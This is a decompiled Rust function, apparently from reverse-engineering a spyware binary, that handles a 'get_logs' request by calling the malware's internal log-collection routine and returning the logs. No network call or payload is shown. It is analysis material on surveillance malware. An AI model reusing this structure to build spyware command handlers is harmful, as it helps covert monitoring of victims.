
  int128_t* spyware::actions::log_actions::get_logs_request::h84eb7739ff3a4934(int128_t* arg1)

{
    char const* const var_78;
    void** const var_50;
    int64_t var_40;
    
    if (core::sync::atomic::atomic_load::h8c88032dab18ab12(
        &log::MAX_LOG_LEVEL_FILTER::h115edbfc95f53bc0, 0) >= 4)
    {
        var_50 = &data_4b99d8;
        int64_t var_48_1 = 1;
        var_40 = 8;
        int128_t var_38_1 = {0};
        int64_t rax_1 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b99f8);
        var_78 = "spyware::actions::log_actionsspy…";
        int64_t var_70_1 = 0x1d;
        char const* const var_68_1 = "spyware::actions::log_actionsspy…";
        int64_t var_60_1 = 0x1d;
        int64_t var_58_1 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_50, 4, &var_78);
    }
    
    int64_t var_20;
    spyware::logging::core::get_logs::h979297f7bb1c44d2(&var_20);
    
    if (!(0 + -(var_20)))
    {
        int64_t var_10;
        arg1[1] = var_10;
        *arg1 = var_20;
        *(arg1 + 0x18) = -0x8000000000000000;
        return arg1;
    }
    
    if (core::sync::atomic::atomic_load::h8c88032dab18ab12(
        &log::MAX_LOG_LEVEL_FILTER::h115edbfc95f53bc0, 0))
    {
        var_50 = &data_4b99e8;
        int64_t var_48_2 = 1;
        var_40 = 8;
        int128_t var_38_2 = {0};
        int64_t rax_3 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9a10);
        var_78 = "spyware::actions::log_actionsspy…";
        int64_t var_70_2 = 0x1d;
        char const* const var_68_2 = "spyware::actions::log_actionsspy…";
        int64_t var_60_2 = 0x1d;
        int64_t var_58_2 = rax_3;
        log::__private_api::log::h13afddf373bd7d7f(&var_50, 1, &var_78);
    }
    
    var_78 = nullptr;
    int64_t var_70_3 = 8;
    int64_t var_68_3 = 0;
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4bd00d1297ead281(&var_50);
    *(arg1 + 0x28) = var_40;
    *(arg1 + 0x18) = var_50;
    arg1[1] = var_68_3;
    *arg1 = var_78;
    arg1[3] = 1;
    return arg1;
}
